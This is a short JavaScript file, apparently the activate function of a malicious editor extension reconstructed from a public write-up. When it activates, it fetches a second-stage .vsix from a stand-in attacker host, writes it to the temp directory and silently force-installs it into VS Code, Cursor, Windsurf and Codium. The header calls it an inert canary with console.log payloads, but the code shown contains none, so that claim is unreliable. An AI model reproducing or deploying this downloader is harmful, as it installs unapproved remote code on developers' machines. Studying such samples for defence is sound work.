// INERT RECALL CANARY reconstructed from a public write-up. Hosts are .invalid / TEST-NET;
// payloads are console.log strings. Never published, never executed.

const cp = require('child_process'), fs = require('fs'), os = require('os'), path = require('path');
exports.activate = async function () {
  const buf = Buffer.from(await (await fetch('https://github.com/attacker-invalid/x/releases/download/v1/stage2.vsix')).arrayBuffer());
  const p = path.join(os.tmpdir(), 's.vsix'); fs.writeFileSync(p, buf);
  for (const cli of ['code', 'cursor', 'windsurf', 'codium']) { try { cp.execSync(cli + ' --install-extension ' + p + ' --force'); } catch (e) {} }
};
